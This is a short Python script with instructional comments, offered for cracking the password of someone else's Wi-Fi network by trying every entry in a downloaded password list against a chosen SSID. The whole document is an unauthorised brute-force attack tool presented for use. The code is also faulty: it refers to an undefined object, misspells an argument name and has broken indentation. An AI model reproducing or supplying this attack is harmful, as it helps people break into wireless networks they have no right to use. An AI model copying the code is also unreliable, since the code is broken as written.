// install Wireless library
// download a  passowrdlist to use to crack the password
// replace the name of the ssid wiht the name of the wifi you want hack into 
// also replace the nmae of the wordlist  in line 8 with .txt extension
// if you are using this is mobile be sure to download a python compiler 
// i am using Pydroid 3 app to program 
// thank you for giving me your time 
 
from Wireless import Wireless
wifi = Wireless()
 
with open('name of password list here', 'r') as file:
	for line in file.readlines():
		if wire.connect(ssid='name of the wifi network',pasword=line.strip()) == True:
			print( '[ + ]' + line.strip() + ' succesfull in cracking password')
	    else :
	    	print('[ - ]' +line.strip() + ' failed in carcking password')